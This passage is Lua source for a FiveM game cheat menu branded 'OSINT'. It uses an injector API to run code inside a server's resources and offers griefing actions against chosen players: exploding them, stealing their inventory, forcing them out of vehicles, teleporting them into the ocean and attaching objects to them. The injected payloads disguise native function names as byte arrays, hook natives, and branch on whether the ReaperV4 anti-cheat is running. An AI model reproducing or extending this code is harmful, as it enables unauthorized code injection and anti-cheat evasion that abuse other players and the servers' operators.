                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Server",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        { type = "button", label = "Select Everyone" },
                        { type = "button", label = "Un-Select Everyone" },
                        { type = "button", label = "Clear Selection" },
                        { type = "divider", label = "Nearby Players" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        { type = "button", label = "Teleport to Player", desc = 'This will teleport you to the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "OSINT", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    local playerPed = GetPlayerPed(player)
                                    local playerCoords = GetEntityCoords(playerPed)
                                    local playerHeading = GetEntityHeading(playerPed)

                                    SetEntityCoords(PlayerPedId(), playerCoords.x, playerCoords.y, playerCoords.z, false, false, false, false)
                                    SetEntityHeading(PlayerPedId(), playerHeading)
                                    self:Notify("success", "OSINT", ("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "checkbox", label = "Spectate Player", checked = false, desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                self:HandleSpectateToggle(targetPlayer, checked)
                            end
                        },
                        { type = "button", label = "Copy Appearance", desc = 'Copy Players Clothing',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end
                                
                                local targetServerId = targetPlayers[1]
                                local ReaperV4Started = GetResourceState("ReaperV4") == 'started' 

                                if ReaperV4Started then
                                    MachoInjectThread(0, "any", "", string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]], targetServerId))
                                else
                                local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end

                                    local function findClientIdByServerId(sid)
                                        local players = _g(_b("GetActivePlayers"))()
                                        for _, pid in ipairs(players) do
                                            if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then
                                            print("^1[ERROR] Client ID not found for Server ID: " .. targetSid .. "^0")
                                            return
                                        end

                                        local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                        local myPed = _g(_b("PlayerPedId"))()

                                        if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                            print("^2[OSINT] Copying clothing from Server ID: " .. targetSid .. "^0")

                                            -- Copy clothing components
                                            _g(_b("SetPedComponentVariation"))(myPed, 1,  _g(_b("GetPedDrawableVariation"))(targetPed, 1),  _g(_b("GetPedTextureVariation"))(targetPed, 1),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 3,  _g(_b("GetPedDrawableVariation"))(targetPed, 3),  _g(_b("GetPedTextureVariation"))(targetPed, 3),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 4,  _g(_b("GetPedDrawableVariation"))(targetPed, 4),  _g(_b("GetPedTextureVariation"))(targetPed, 4),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 6,  _g(_b("GetPedDrawableVariation"))(targetPed, 6),  _g(_b("GetPedTextureVariation"))(targetPed, 6),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 8,  _g(_b("GetPedDrawableVariation"))(targetPed, 8),  _g(_b("GetPedTextureVariation"))(targetPed, 8),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)

                                            -- Copy props (hats, glasses, earrings)
                                            _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)

                                            print("^2[OSINT] Clothing copied successfully!^0")
                                        else
                                            print("^3[WARNING] Target or local ped does not exist.^0")
                                        end
                                    end

                                    -- Execute directly
                                    CopyClothing(targetServerId)
                                end

                                self:Notify("success", "OSINT", "Copied clothing!", 5000)
                            end
                        },
                        { type = "button", label = "Launch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleLaunchPlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Attempting to TEST", 5000)                            
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        { type = "button", label = "Explode Player", desc = 'This will attempt to explode the player using a vehicle',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                for _, sid in ipairs(targetPlayers) do
                                    local targetPlayer = sid
                                    local player = GetPlayerFromServerId(sid)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                        CPlayers[sid] = nil
                                        return
                                    else
                                        local script = [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]] .. tostring(targetPlayer) .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]]
                                        MachoInjectResourceRaw("any", script, targetPlayer)
                                        self:Notify("success", "OSINT", "Attempting to Explode Player", 5000)
                                    end
                                end

                                OSINT:UpdateListMenu()
                            end
                        },
                        { type = "button", label = "Steal Inventory", desc = 'This will attempt to open the selected players inventory',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleTakeInventory(targetPlayers)
                                self:Notify("success", "OSINT", "Attempting to steal inventory", 5000)
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        { type = "button", label = "Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Cloned Player", 5000)
                            end
                        },
                        { type = "button", label = "Attack Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "scrollable", 
                            label = "Attach Vehicle", 
                            scrollType = "onEnter", 
                            value = 1, 
                            values = { 
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet", "kuruma",
                                "zentorno", "entityxf", "carbonizzare", "elegy", "massacro", "vagner",
                                "nightshark", "banshee", "feltzer2", "ruston", "bullet", "elegy2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end
                                OSINT:AttachSelectedVehicle(targetPlayers, value)
                                self:Notify("success", "OSINT", "Vehicle Attached to " .. #targetPlayers .. " Player(s)", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Vehicle Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "OSINT", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "OSINT", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },

                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        { type = "button", label = "Kick From Vehicle",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "button", label = "Teleport to Ocean",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
